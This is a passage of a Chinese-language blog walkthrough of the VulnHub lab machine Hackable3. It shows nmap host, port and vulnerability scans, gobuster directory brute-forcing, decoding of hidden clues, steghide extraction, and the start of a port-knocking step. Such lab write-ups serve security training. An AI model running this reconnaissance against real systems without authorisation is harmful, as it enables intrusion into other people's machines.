@@ -1,0 +1,783 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机说明 靶机说明：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;hackable-iii,720&#x2F; 下载地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;hackable&#x2F;hackable3.ova  主机发现123456789101112131415┌──(kali㉿kali)-[~&#x2F;miao&#x2F;vulnhub&#x2F;hackable3]└─$ sudo nmap -sn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackable3">
+<meta property="og:url" content="http://miao-sec.github.io/vulnhub/Hackable3/index.html">
+<meta property="og:site_name" content="Miao&#39;s Blog">
+<meta property="og:description" content="靶机说明 靶机说明：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;hackable-iii,720&#x2F; 下载地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;hackable&#x2F;hackable3.ova  主机发现123456789101112131415┌──(kali㉿kali)-[~&#x2F;miao&#x2F;vulnhub&#x2F;hackable3]└─$ sudo nmap -sn">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111649036.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111727485.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111731287.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111740037.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111742396.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111744008.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111747161.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502121110939.png">
+<meta property="article:published_time" content="2025-06-20T02:55:07.000Z">
+<meta property="article:modified_time" content="2025-06-20T02:57:58.359Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="提权-pwnkit">
+<meta property="article:tag" content="敲击端口">
+<meta property="article:tag" content="提权-lxd">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111649036.png">
+  
+  
+  
+  <title>Hackable3 - Miao&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Miaosec</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Hackable3"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-20 10:55" pubdate>
+          2025年6月20日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          24 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Hackable3</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul>
+<li>靶机说明：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hackable-iii,720/">https://www.vulnhub.com/entry/hackable-iii,720/</a></li>
+<li>下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/hackable/hackable3.ova">https://download.vulnhub.com/hackable/hackable3.ova</a></li>
+</ul>
+<h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 14:19 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00016s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00060s latency).<br>MAC Address: 08:00:27:ED:9E:57 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00072s latency).<br>MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 1.93 seconds<br></code></pre></td></tr></table></figure>
+<h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --min-rate 10000 -p- 192.168.2.13                     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 14:20 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE    SERVICE<br>22/tcp filtered ssh<br>80/tcp open     http<br>MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.00 seconds<br></code></pre></td></tr></table></figure>
+<ul>
+<li>发现只开放80端口，22端口处于被过滤状态<br>（2）端口细节扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80 192.168.2.13 -oA nmapscan/detail<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 14:22 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00075s latency).<br><br>PORT   STATE  SERVICE VERSION<br>22/tcp closed ssh<br>80/tcp open   http    Apache httpd 2.4.46 ((Ubuntu))<br>MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br><br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 18.33 seconds<br><br></code></pre></td></tr></table></figure>
+（3）进行漏洞扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80 192.168.2.13 -oA nmapscan/vuln <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 14:31 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00033s latency).<br><br>PORT   STATE    SERVICE<br>22/tcp filtered ssh<br>80/tcp open     http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.13</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.2.13:80/login_page/login.html</span><br><span class="hljs-string">|     Form id: ckb1</span><br><span class="hljs-string">|_    Form action: ../login.php</span><br><span class="hljs-string">| http-sql-injection: </span><br><span class="hljs-string">|   Possible sqli for queries:</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/css/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/css/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/css/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/css/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=S%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/images/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/images/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/images/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/images/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/fonts/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/fonts/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/fonts/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/fonts/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=M%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|   Possible sqli for forms:</span><br><span class="hljs-string">|     Form at path: /login_page/login.html, form&#x27;</span>s action: ../login.php. Fields that might be vulnerable:<br>|       user<br>|_      remember-me<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /login.php: Possible admin folder</span><br><span class="hljs-string">|   /home.html: Possible admin folder</span><br><span class="hljs-string">|   /backup/: Backup folder w/ directory listing</span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /config/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.46 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /css/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.46 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_  /js/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.46 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 32.79 seconds</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，只是一个图片，查看页面源码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111649036.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>找到一个注释，提示，jubiscleudo，请不要忘记在离开你的部门时激活端口敲门，并告诉老板不要忘记批准，jpg文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Please, jubiscleudo, don<span class="hljs-string">&#x27;t forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com</span><br></code></pre></td></tr></table></figure>
+（2）进行目录扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.13 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html<br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.13<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 1095]<br>/home.html            (Status: 200) [Size: 11327]<br>/login.php            (Status: 200) [Size: 487]<br>/css                  (Status: 301) [Size: 310] [--&gt; http://192.168.2.13/css/]<br>/js                   (Status: 301) [Size: 309] [--&gt; http://192.168.2.13/js/]<br>/config               (Status: 301) [Size: 313] [--&gt; http://192.168.2.13/config/]<br>/config.php           (Status: 200) [Size: 507]<br>/backup               (Status: 301) [Size: 313] [--&gt; http://192.168.2.13/backup/]<br>/robots.txt           (Status: 200) [Size: 33]<br>/imagens              (Status: 301) [Size: 314] [--&gt; http://192.168.2.13/imagens/]<br>/login_page           (Status: 301) [Size: 317] [--&gt; http://192.168.2.13/login_page/]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 882236 / 882240 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+（3）访问robot.txt，显示不允许访问<code>config</code>，尝试进行访问，发现是一个base64的编码<code>MTAwMDA=</code>，进行解码，解出来是<code>10000</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111727485.png" srcset="/img/loading.gif" lazyload><br>（4）访问login.php，显示空白页面，查看页面源码，是一个PHP代码，里面有一个<code>3.jpg</code>，根据提示，尝试去读取图片中的信息<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111731287.png" srcset="/img/loading.gif" lazyload><br>（5）使用steghide去读取图片信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> wget http://192.168.2.13/3.jpg                                      <br>--2025-02-11 15:05:32--  http://192.168.2.13/3.jpg<br>正在连接 192.168.2.13:80... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：61259 (60K) [image/jpeg]<br>正在保存至: “3.jpg”<br><br>3.jpg                         100%[==============================================&gt;]  59.82K  --.-KB/s  用时 0s      <br><br>2025-02-11 15:05:32 (819 MB/s) - 已保存 “3.jpg” [61259/61259])<br>┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ steghide info 3.jpg <br><span class="hljs-string">&quot;3.jpg&quot;</span>:<br>  format: jpeg<br>  capacity: 3.6 KB<br>Try to get information about embedded data ? (y/n) y<br>Enter passphrase: <br>  embedded file <span class="hljs-string">&quot;steganopayload148505.txt&quot;</span>:<br>    size: 12.0 Byte<br>    encrypted: rijndael-128, cbc<br>    compressed: <span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure></li>
+<li>找到图片里面有一个txt文件，进行提取，找到一个端口号<code>65535</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> steghide extract -sf 3.jpg<br>Enter passphrase: <br>wrote extracted data to <span class="hljs-string">&quot;steganopayload148505.txt&quot;</span>.<br>┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">cat</span> steganopayload148505.txt <br>porta:65535       <br></code></pre></td></tr></table></figure>
+（6）访问<code>/css</code>，在里面找到一个<code>2.txt</code>，查看发现是<code>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;------------------....</code>，结果搜索，发现是<code>Brainfuck</code>加密，进行解密得到<code>4444</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111740037.png" srcset="/img/loading.gif" lazyload><br>（7）访问<code>config.php</code>，发现页面是空白的，查看页面源码，是数据库连接的配置文件<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111742396.png" srcset="/img/loading.gif" lazyload><br>（8）访问<code>/backup</code>，找到里面存在一个字典<code>wordlist.txt</code>，下载到本地<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111744008.png" srcset="/img/loading.gif" lazyload><br>（9）访问<code>/imagens</code>，里面存在一些图片<br>（10）访问<code>/login_page</code>，里面找到一个<code>login.html</code>，进行访问，发现是一个登录页面，尝试进行登录，直接跳转至<code>login.php</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111747161.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<h1 id="敲击端口"><a href="#敲击端口" class="headerlink" title="敲击端口"></a>敲击端口</h1><p>（1）根据开始的提示和22端口处于关闭状态，需要进行敲击激活端口，收集到端口为<code>10000,4444,65535</code>，使用<code>knock</code>进行敲击</p>
